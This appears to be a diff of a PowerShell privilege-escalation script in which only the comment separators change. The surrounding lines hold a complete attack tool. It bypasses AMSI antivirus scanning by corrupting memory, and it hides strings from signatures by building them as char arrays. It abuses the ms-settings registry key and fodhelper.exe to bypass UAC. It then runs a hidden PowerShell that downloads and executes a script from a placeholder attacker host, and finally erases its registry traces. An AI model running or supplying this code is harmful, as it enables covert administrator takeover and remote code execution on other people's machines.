@@ -2,7 +2,7 @@
 # Technique : HKCU ms-settings shell\open\command -> fodhelper.exe auto-elevate
 # AV Evasion: inline AMSI bypass, char-array string construction, .NET Registry API
 
-# ── AMSI Bypass (inline context corruption) ───────────────────────────────────
+# -- AMSI Bypass (inline context corruption) -----------------------------------
 $a=[Ref].Assembly.GetTypes()
 Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
 $d=$c.GetFields('NonPublic,Static')
@@ -12,17 +12,17 @@ $g=$f.GetValue($null)
 [Int32[]]$buf=@(0)
 [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 
-# ── Elevation check ───────────────────────────────────────────────────────────
+# -- Elevation check -----------------------------------------------------------
 $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $wp = New-Object System.Security.Principal.WindowsPrincipal($id)
 if ($wp.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 0 }
 
-# ── Payload ───────────────────────────────────────────────────────────────────
+# -- Payload -------------------------------------------------------------------
 # Replace with your actual elevated command
 $payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c " +
            "`"IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')`""
 
-# ── String construction (avoids static signatures on known IOC strings) ────────
+# -- String construction (avoids static signatures on known IOC strings) --------
 
 # "ms-settings"
 $s1 = [string]::Join('', [char[]]@(109,115,45,115,101,116))
@@ -39,17 +39,17 @@ $f1 = [string]::Join('', [char[]]@(102,111,100,104,101))
 $f2 = [string]::Join('', [char[]]@(108,112,101,114,46,101,120,101))
 $fodBin = $f1 + $f2
 
-# ── Write registry via .NET API (avoids PS cmdlet signatures) ─────────────────
+# -- Write registry via .NET API (avoids PS cmdlet signatures) -----------------
 $regPath = "Software\Classes\" + $msKey + "\shell\open\command"
 $key = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($regPath)
 $key.SetValue('', $payload)
 $key.SetValue($delExec, '')
 $key.Close()
 
-# ── Trigger auto-elevation ────────────────────────────────────────────────────
+# -- Trigger auto-elevation ----------------------------------------------------
 $bin = $env:SystemRoot + '\System32\' + $fodBin
 Start-Process -FilePath $bin
 
-# ── Cleanup ───────────────────────────────────────────────────────────────────
+# -- Cleanup -------------------------------------------------------------------
 Start-Sleep -Seconds 3
 [Microsoft.Win32.Registry]::CurrentUser.DeleteSubKeyTree("Software\Classes\" + $msKey, $false)
